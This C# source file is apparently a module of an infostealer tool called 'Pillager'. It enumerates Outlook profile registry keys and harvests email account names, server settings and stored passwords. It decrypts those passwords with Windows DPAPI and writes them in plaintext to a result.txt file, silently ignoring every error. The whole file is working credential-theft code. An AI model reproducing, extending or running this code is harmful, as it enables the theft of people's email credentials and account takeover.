using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Pillager.Helper;

namespace Pillager.Mails
{
    internal class Outlook : ICommand
    {
        private Regex mailClient = new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$");
        private Regex smptClient = new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$");

        public string GrabOutlook()
        {
            StringBuilder data = new StringBuilder();

            string[] RegDirecories = {
                "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
            };

            string[] mailClients = {
                "SMTP Email Address","SMTP Server","POP3 Server",
                "POP3 User Name","SMTP User Name","NNTP Email Address",
                "NNTP User Name","NNTP Server","IMAP Server","IMAP User Name",
                "Email","HTTP User","HTTP Server URL","POP3 User",
                "IMAP User", "HTTPMail User Name","HTTPMail Server",
                "SMTP User","POP3 Password2","IMAP Password2",
                "NNTP Password2","HTTPMail Password2","SMTP Password2",
                "POP3 Password","IMAP Password","NNTP Password",
                "HTTPMail Password","SMTP Password"
            };

            foreach (string dir in RegDirecories)
                data.Append(Get(dir, mailClients));

            return data.ToString();
        }

        private string Get(string path, string[] clients)
        {
            StringBuilder data = new StringBuilder();
            try
            {
                foreach (string client in clients)
                    try
                    {
                        object value = GetInfoFromRegistry(path, client);
                        if (value == null) continue;
                        if (client.Contains("Password") && !client.Contains("2"))
                            data.AppendLine($"{client}: {DecryptValue((byte[])value)}");
                        else
                            if (smptClient.IsMatch(value.ToString()) || mailClient.IsMatch(value.ToString()))
                            data.AppendLine($"{client}: {value}");
                        else
                            data.AppendLine($"{client}: {Encoding.UTF8.GetString((byte[])value).Replace(Convert.ToChar(0).ToString(), "")}");
                    }
                    catch { }

                RegistryKey key = Registry.CurrentUser.OpenSubKey(path, false);
                if (key != null) 
                {
                    string[] Clients = key.GetSubKeyNames();

                    foreach (string client in Clients)
                        data.Append($"{Get($"{path}\\{client}", clients)}");
                }
            }
            catch { }
            return data.ToString();
        }

        private object GetInfoFromRegistry(string path, string valueName)
        {
            object value = null;
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
                if (registryKey == null) return null;
                value = registryKey.GetValue(valueName);
                registryKey.Close();
            }
            catch { }
            return value;
        }

        private string DecryptValue(byte[] encrypted)
        {
            try
            {
                byte[] decoded = new byte[encrypted.Length - 1];
                Buffer.BlockCopy(encrypted, 1, decoded, 0, encrypted.Length - 1);
                return Encoding.UTF8.GetString(
                    ProtectedData.Unprotect(
                        decoded, null, DataProtectionScope.CurrentUser))
                    .Replace(Convert.ToChar(0).ToString(), "");
            }
            catch { }
            return "null";
        }

        public override void Save(string path)
        {
            try
            {
                string result = GrabOutlook();
                if (string.IsNullOrEmpty(result)) return;
                string savepath = Path.Combine(path, "Outlook");
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, "result.txt"), result, Encoding.UTF8);
            }
            catch { }
        }
    }
}
